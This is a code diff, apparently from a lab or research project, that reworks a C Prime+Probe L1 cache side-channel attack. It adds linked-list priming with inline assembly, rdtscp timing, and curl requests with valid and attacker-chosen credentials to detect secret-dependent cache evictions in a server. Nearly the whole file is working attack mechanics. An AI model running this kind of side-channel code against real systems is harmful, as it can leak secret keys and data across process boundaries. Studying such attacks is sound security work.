@@ -18,26 +18,30 @@
 #define TRAINING_REPS 100
 #define ATTACK_RUNS 100.0
 
-#define EVICTION_THRESHOLD 5
+#define EVICTION_THRESHOLD 20
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
 
-unsigned int probe_array[PROBE_ARR_SIZE] __attribute__((aligned(4096)));; // allocates int array of size = L1_SIZE and aligns to page
+unsigned int probe_array[PROBE_ARR_SIZE] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page
+struct primelist_t *heads[64];
+
 CURL *curl_handle;
 
 uint64_t c_threshold;
 int main(int argc, char* argv[]) {
-    // printf("INT SIZE: %ld bytes\n", sizeof(int)); int size is 4 bytes
+    printf("Probe array base address: %p\n", (void*)probe_array);
+    printf("expected cache set for byte value 0x91 (145):\n");
+
+    
+    setup_linked_lists();
+
     // find threshold
-    c_threshold = cache_threshold();
+    c_threshold = 100; //cache_threshold(); // or set ~100
 
     // prep attack and training data for request
-    char* attack_id = "2";
-    if (argc == 2){
-        attack_id = argv[1]; 
-    }
+    char *valid_data = valid_data = "username=user1&password=password&id=2";;
     char attack_data[64];
-    snprintf(attack_data, 64, "username=user1&password=password&id=%s", attack_id);
-    char *valid_data = "username=user1&password=password&id=2";
+    get_inputs(attack_data, argc, argv);
+    
 
     // set up curl 
     curl_global_init(CURL_GLOBAL_ALL);
@@ -47,11 +51,14 @@ int main(int argc, char* argv[]) {
         curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
     }
 
-    int top_sets[SETS+1] = {0};
+    //  ==================== PRIME + PROBE ===================
+    int count[SETS] = {0}; // records sets that have been touched
+
+    // 100 attack runs
     for (int j = 0; j < 100; j++) {
 
-        int count[SETS] = {0}; // records sets that have been touched
-        int baseline[SETS] = {0};    
+        
+        int valid_baseline[SETS] = {0};    
 
         int loops = ATTACK_RUNS;
         while (loops > 0){
@@ -59,10 +66,11 @@ int main(int argc, char* argv[]) {
             for(int i = 0; i < TRAINING_REPS; i++){
                     prime_cache(); // prime L1 with probe array
 
+                    _mm_mfence();
                     make_request(valid_data); // send valid credentials
-
+                    _mm_mfence();
                     // adds to count to calculate baseline
-                    check_cache_presence(baseline);
+                    check_cache_presence(valid_baseline);
                 }
             
             
@@ -72,75 +80,96 @@ int main(int argc, char* argv[]) {
             // cache check 
             make_request(attack_data);
             _mm_mfence();
-
+            
             check_cache_presence(count);
             loops --;
         }
-        float highest_diff = 0;
-        int set = SETS;
-        printf("\n===== Eviction Difs =====\n");
-        for (int i = 0; i < SETS; i++) {
-            // get avg misses for each attack run
-            float avg_baseline = baseline[i] / ATTACK_RUNS; // happens ATTACK_RUNS * 100 times -> attacks are only done 100 times
+
         
-            float diff = (float)count[i] - avg_baseline; 
-
-            // if attack increased eviction more than threshold
-            if (diff > EVICTION_THRESHOLD) { 
-                printf("Set %d: +%.2f\n", i, diff); // print diff
-                if (diff > highest_diff){
-                    set = i;
-                    highest_diff = diff;
-                }
-            }
-        }
-        top_sets[set] ++;
+        printf("COMPLETED ATTACK CYCLE: %d/100\n", j);
     }
-    printf("\n ==== TOP SETS ==== \n");
-    for (int i = 0; i < SETS; i++) {
-        if (top_sets[i] > 0){
-            printf("Set %d: %d\n", i, top_sets[i]);
-        }
+    
+    for (int j = 0; j < SETS; j++){
+        printf("SET %d: %d evictions\n", j, count[j]);
     }
-
     curl_easy_cleanup(curl_handle);
     return 0;
 }
+
+void setup_linked_lists() {
+    for (int s = 0; s < 64; s++) {
+        struct primelist_t *prev = NULL;
+        for (int w = 0; w < WAYS; w++) {
+            // (Way * Total Sets * Line Size) + (Current Set * Line Size)
+            uintptr_t addr = (uintptr_t)probe_array + (w * SETS * LINE_SIZE) + (s * 64);
+            struct primelist_t *current = (struct primelist_t *)addr;
+
+            if (prev) {
+                prev->probe = current; // forwards for probing
+                current->prime = prev; // backwards for priming
+            } else {
+                heads[s] = current; // beginning of list
+                current->prime = NULL;
+            }
+            prev = current;
+        }
+        prev->probe = NULL; // List end
+    }
+}
+
+
 void prime_cache(){
-    // Prime L1 cache
-    // just need to hit each cache line once (so will skip indexes on the same line)
-    for (int j = 0; j < 5; j++){
-        // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
-        for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
-            probe_array[i] = 0; 
+    // prime L1 
+    // just need to hit each cache line once 
+    for (int i = 0; i < 5; i++){
+        for (int s = 0; s < 64; s++) {
+            struct primelist_t *curr = heads[s];
+            
+            // assembly to jump through prime ptrs
+            asm volatile (
+                "1:                     \n"
+                "  mov 8(%0), %0        \n" 
+                "  test %0, %0          \n"
+                "  jne 1b               \n"
+                : "+r" (curr)
+                : 
+                : "memory"
+            );
         }
     }
 }
 
 void check_cache_presence(int *count){
-    int present = 0;
-    uint64_t t1, t2;
-    unsigned int pid;
-    for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
+    
+    for (int s = 0; s < 64; s++) {
+        struct primelist_t *curr = heads[s];
+        int set_evictions = 0;
+
+        // traverse using the probe ptr at offset 0
+        while (curr != NULL && curr->probe != NULL) {
+            uint64_t t1, t2;
+            unsigned int pid;
+
             _mm_lfence();
             t1 = __rdtscp(&pid);
             _mm_lfence();
 
-            pid = probe_array[i];
+            curr = curr->probe; // load val from mem
 
             _mm_lfence();
             t2 = __rdtscp(&pid);
             _mm_lfence();
-            
-            if (t2 - t1 < c_threshold){
-                present ++;
-                
-            }
-            else{
-                int set_index = (i / INDEXES_PER_LINE) % SETS;
-                count[set_index]++;
+
+            // if > threshold add miss
+            if ((t2 - t1) > c_threshold) {
+                set_evictions++;
             }
         }
+
+        if (set_evictions > 0) {
+            count[s]++;
+        }
+    }
     
     // printf("%d/%d cache hits\n", present, NO_LINES);
 }
@@ -214,6 +243,11 @@ size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
 }
 
 
-
-
-
+void get_inputs(char attack_data[], int argc, char* argv[]){
+    char *attack_id = "2";
+    if (argc == 2){
+        attack_id = argv[1]; 
+    }
+    snprintf(attack_data, 64, "username=user1&password=password&id=%s", attack_id);
+    
+}
